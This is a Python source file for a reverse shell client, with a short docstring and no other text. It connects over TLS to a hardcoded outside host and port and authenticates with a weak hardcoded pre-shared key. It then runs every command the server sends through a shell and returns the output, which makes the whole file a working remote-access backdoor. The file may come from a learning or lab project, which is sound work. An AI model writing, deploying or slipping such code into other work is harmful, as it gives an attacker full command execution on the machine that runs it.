#!/usr/bin/env python3
"""
Reverse Shell Client
--------------------
This client connects back to the server and waits for commands.
It handles directory change requests specially and executes all other commands.
"""
import socket
import os
import subprocess
import ssl
import sys
import argparse

# Change here the default values
parser = argparse.ArgumentParser()
parser.add_argument('--port', type=int,
                    help='Port to connect to', default=9999)
parser.add_argument('--host', type=str,
                    help='Host to connect to', default="asi.ericroy.net")
parser.add_argument('--password', type=str,
                    help='Pre-shared key', default="123456789")
parser.add_argument('--public-key-path', type=str,
                    help='Server\'s certificate path', default="cert.pem")
args = parser.parse_args()


def connect_to_server() -> ssl.SSLSocket:
    try:
        # Create a TLS socket and connect to the server
        print("Creating socket...")
        s = create_tls_socket()
        print("Socket created successfully.")
        print("Connecting to the server...")
        s.connect((args.host, args.port))
        print("Connected to the server successfully.")
        # Send PSK to authenticate themselves to the server
        print("Sending PSK to the server...")
        s.send(args.password.encode())
        print("Client authenticated.")
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        sys.exit(1)


def create_tls_socket() -> ssl.SSLSocket:
    """
    Creates a socket over TLS that checks also cert.pem.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)

    # TLS context for client-side
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_REQUIRED
    # Path to the self-signed certificate for server authentication
    context.load_verify_locations(args.public_key_path)

    # Wrap the socket for TLS (client-side)
    ssocket = context.wrap_socket(s, server_hostname=args.host)
    return ssocket


def handle_commands(s: ssl.SSLSocket) -> None:
    while True:
        try:
            # Receive command from the server
            command = receive_command(s)
            if not command:
                continue

            # Execute the command and get the output
            output = execute_command(command)

            # Send the output back to the server
            s.send(output.encode("utf-8"))
        except socket.timeout:
            pass


def receive_command(s: ssl.SSLSocket) -> str:
    """
    Receives a command from the server.
    """
    data = s.recv(1024)
    if not data:
        return None
    command = data.decode("utf-8", errors="ignore")
    return command


def execute_command(command: str):
    """
    Executes the received command and returns the output.
    Handles 'cd' commands separately.
    """
    # Handle 'cd ' (change directory) commands separately
    if command.startswith('cd '):
        try:
            os.chdir(command[3:].strip())
            output = ""
        except Exception as e:
            output = f"Error changing directory: {e}\n"
    else:
        # Execute the received command using subprocess
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout, stderr = proc.communicate()
        output = stdout.decode() + stderr.decode()

    # Append current working directory as a prompt for the next command
    cwd = os.getcwd() + "> "
    output += cwd
    return output


def send_output(s: ssl.SSLSocket, output: str) -> None:
    """
    Sends the output back to the server.
    """
    s.send(output.encode("utf-8"))


def main():
    """
    Main function to connect to the server and handle commands.
    """
    with connect_to_server() as s:
        print("Client started.")
        print("You can stop the client whenever with Ctrl+C or Ctrl+D.")
        try:
            handle_commands(s)
        # Handle Ctrl+C, Ctrl+D
        except:
            pass
        finally:
            print("Exiting.")


if __name__ == '__main__':
    main()
